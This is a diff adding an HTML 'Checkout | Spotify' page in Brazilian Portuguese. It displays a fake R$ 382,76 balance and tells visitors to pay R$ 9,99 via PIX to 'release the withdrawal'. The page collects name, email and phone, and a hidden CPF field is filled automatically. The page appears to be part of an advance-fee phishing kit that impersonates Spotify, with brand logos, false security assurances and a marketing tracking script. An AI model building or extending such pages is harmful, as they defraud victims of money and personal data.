@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout | Spotify</title>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/style.css">
+    
+    <!-- CONFIG.JS - Configurações Centralizadas -->
+    <script src="js/config.js"></script>
+</head>
+<body>
+    <!-- TOPO FIXO -->
+    <div id="topoFixo">
+        <img src="images/logo.png" id="logo" alt="Spotify">
+        <div id="saldoatual">
+            Saldo: R$ 382,76
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <!-- LOGO -->
+            <img src="images/logowhite.png" id="logocentral" alt="Spotify">
+
+            <!-- TÍTULO -->
+            <h1 id="titulo">Finalizar Pagamento</h1>
+            <p id="subtitulo">Complete sua verificação para liberar o saque</p>
+
+            <!-- RESUMO DO PEDIDO -->
+            <div class="resumo-pedido">
+                <div class="item-resumo">
+                    <span class="label">Produto</span>
+                    <span class="valor" id="produtoNome">Prioridade Premium</span>
+                </div>
+                <div class="item-resumo">
+                    <span class="label">Valor</span>
+                    <span class="valor destaque" id="produtoValor">R$ 9,99</span>
+                </div>
+                <div class="item-resumo">
+                    <span class="label">Saldo a receber</span>
+                    <span class="valor">R$ 382,76</span>
+                </div>
+            </div>
+
+            <!-- FORMULÁRIO -->
+            <form id="formCheckout">
+                <div class="campo">
+                    <label for="nome">Nome completo</label>
+                    <input type="text" id="nome" name="nome" placeholder="Digite seu nome completo" required>
+                </div>
+
+                <div class="campo">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" name="email" placeholder="seu@email.com" required>
+                </div>
+
+                <div class="campo">
+                    <label for="telefone">Telefone</label>
+                    <input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" maxlength="15" required>
+                </div>
+                
+                <!-- CPF oculto gerado automaticamente -->
+                <input type="hidden" id="cpf" name="cpf">
+
+                <button type="submit" id="btnPagar">
+                    <span class="btn-text">PAGAR COM PIX</span>
+                    <span class="btn-loader" style="display: none;">
+                        <i class="spinner"></i> Processando...
+                    </span>
+                </button>
+            </form>
+
+            <!-- BENEFÍCIOS -->
+            <div class="beneficios">
+                <div class="beneficio">
+                    <span class="icone">⚡</span>
+                    <span>Liberação instantânea</span>
+                </div>
+                <div class="beneficio">
+                    <span class="icone">🔒</span>
+                    <span>Pagamento seguro</span>
+                </div>
+                <div class="beneficio">
+                    <span class="icone">✓</span>
+                    <span>Garantia de recebimento</span>
+                </div>
+            </div>
+
+            <!-- FOOTER -->
+            <p id="termos">
+                Este site é protegido pelo reCAPTCHA e está sujeito à 
+                <a href="https://www.spotify.com/br-pt/legal/privacy-policy/" target="_blank">Política de Privacidade</a>
+                e aos <a href="https://policies.google.com/terms?hl=pt-BR" target="_blank">Termos de Serviço do Google</a>.
+            </p>
+        </div>
+    </div>
+
+    <!-- POPUP DE ERRO -->
+    <div id="popupErro" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon erro">⚠️</div>
+            <h3>Erro no pagamento</h3>
+            <p id="mensagemErro">Ocorreu um erro ao processar seu pagamento. Tente novamente.</p>
+            <button onclick="fecharPopup()">Fechar</button>
+        </div>
+    </div>
+
+    <script src="js/checkout.js"></script>
+    
+    <!-- UTMIFY -->
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        async
+        defer>
+    </script>
+</body>
+</html>
